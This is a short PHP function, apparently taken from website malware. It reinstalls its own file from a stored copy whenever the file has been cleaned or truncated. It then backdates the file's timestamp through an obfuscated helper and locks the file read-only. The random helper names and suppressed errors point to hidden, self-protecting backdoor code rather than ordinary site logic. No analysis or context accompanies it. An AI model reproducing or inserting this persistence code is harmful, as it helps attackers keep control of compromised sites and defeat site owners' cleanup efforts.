function sc_restore_self() {
	$size = @filesize(__FILE__);
	if ($size && $size > 5000) {
		return;
	}
	$saved = a09ip7sgac4aqyl1gr5('src', "");
	if ($saved && is_string($saved)) {
		@chmod(__FILE__, 0644);
		@file_put_contents(__FILE__, $saved);
		@touch(__FILE__, dw9_2yhlyjj8r4k_uq81());
		@chmod(__FILE__, 0444);
	}
}
